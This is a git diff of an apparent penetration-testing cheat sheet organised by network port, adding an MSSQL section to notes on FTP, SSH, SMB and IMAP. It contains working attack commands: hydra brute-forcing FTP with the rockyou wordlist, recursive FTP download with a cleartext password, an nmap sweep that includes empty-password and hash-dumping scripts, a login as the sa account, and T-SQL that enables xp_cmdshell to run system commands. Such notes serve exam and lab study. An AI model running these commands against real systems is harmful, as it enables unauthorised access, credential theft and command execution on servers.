@@ -50,6 +50,9 @@ hydra -l steph -P /usr/share/wordlists/rockyou.txt 10.1.1.68 -t 4 ftp
 ````
 wget -r ftp://steph:billabong@10.1.1.68/
 ````
+````
+find / -name Settings.*  2>/dev/null #looking through the files
+````
 
 #### SSH port 22
 ##### Emumeration
@@ -239,6 +242,26 @@ smbclient -U '%' -N \\\\$IP\\<share name> -m SMB3
 ##### Enumeration
 ````
 nmap -p 143 --script imap-ntlm-info $IP
+````
+#### MSSQL port 1433
+##### Enumeration
+````
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $IP
+````
+##### Logging in
+````
+sqsh -S $IP -U sa -P CrimsonQuiltScalp193
+````
+##### Expliotation
+````
+EXEC SP_CONFIGURE 'show advanced options', 1
+reconfigure
+go
+EXEC SP_CONFIGURE 'xp_cmdshell' , 1
+reconfigure
+go
+xp_cmdshell 'whoami'
+go
 ````
 #### NFS port 2049
 ##### Enumeration
